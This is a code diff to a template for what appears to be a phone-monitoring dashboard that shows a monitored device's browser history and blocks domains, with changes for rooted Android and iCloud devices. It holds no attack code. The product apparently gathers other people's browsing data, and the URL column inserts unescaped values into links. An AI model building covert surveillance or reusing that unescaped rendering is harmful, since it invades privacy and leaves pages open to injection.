@@ -6,16 +6,14 @@
     {if !$paid}
         {insert "cp/updatePackage.html"}
     {elseif $hasRecords}
-        {if $di.currentDevice.os=='android' && !$di.currentDevice.rooted && $di.currentDevice.app_version < 64}
-            {include "content/{$di.t->getLocale()}/rootPhoneBrowser.html"}
-        {/if}
-    <form class="form-inline" action="" method="get" style="margin-bottom: 20px;">
-        <label for="add-block" class="control-label">{$di.t->_('Add to blocked list')}:</label>
-        <input class="form-control" name="block" id="add-block" type="text" placeholder="site.com"/>
-        <input class="btn btn-warning" type="submit" value="{$di.t->_('Add domain')}"/>
-    </form>
-
-    <ul class="nav nav-pills" style="overflow: hidden;">
+    {if $isDeviceBlockSiteAvailable}
+        <form class="form-inline" action="" method="get" style="margin-bottom: 20px;">
+            <label for="add-block" class="control-label">{$di.t->_('Add to blocked list')}:</label>
+            <input class="form-control" name="block" id="add-block" type="text" placeholder="site.com"/>
+            <input class="btn btn-warning" type="submit" value="{$di.t->_('Add domain')}"/>
+        </form>  
+    {/if}
+    <ul class="nav nav-pills" style="overflow: hidden;{if !$isDeviceBlockSiteAvailable} display: none{/if}">
         <li><a href="#history" data-toggle="tab">{$di.t->_('History')}</a></li>
         <li><a href="#blocked" data-toggle="tab">{$di.t->_('Blocked')}</a></li>
     </ul>
@@ -37,7 +35,7 @@
                             <th>{$di.t->_('Date')}</th>
                             <th>{$di.t->_('Title')}</th>
                             <th>{$di.t->_('Url')}</th>
-                            <th>{$di.t->_('Actions')}</th>
+                            {if $isDeviceBlockSiteAvailable}<th>{$di.t->_('Actions')}</th>{/if}
                         </tr>
                     </thead>
                 </table>
@@ -132,6 +130,7 @@
                         bAutoWidth: false,
                         bSortMulti: false,
                         iDisplayLength: {$authData.records_per_page},
+                        aaSorting: [[0, 'desc']],
                         oLanguage: {
                             sUrl: '{$di.config.staticDomain}/js/datatables/language/{$di.t->getLocale()}.txt'
                         },
@@ -150,10 +149,11 @@
                                 mData: 'url',
                                 bUseRendered: false,
                                 fnRender: function(obj, value) {
-                                    return  '<a href="' + value + '" target="_blank">' + value + '</a>';
+                                    return  '<a href="' + value + '" class="disable-on-demo" target="_blank">' + value + '</a>';
                                 }
-                            },
-                            {
+                            }
+                            {if $isDeviceBlockSiteAvailable}
+                            ,{
                                 mData: 'url',
                                 sWidth: '100px',
                                 bUseRendered: false,
@@ -164,6 +164,7 @@
                                     });
                                 }
                             }
+                            {/if}
                         ],
                         fnDrawCallback: function() {
                             browserHistory.historyTable = table;
@@ -265,6 +266,8 @@
         <h3>{$di.t->_('Why can the data be unavailable?')}</h3>
         {if $di.currentDevice.os=='android' && $di.currentDevice.app_version >= 64}
             {include "content/{$di.t->getLocale()}/noDataBrowserAndroid.html"}
+        {elseif $di.currentDevice.os=='icloud'}
+            {include "content/{$di.t->getLocale()}/noDataICloud.html"}
         {else}
             {include "content/{$di.t->getLocale()}/noData.html"}
         {/if}
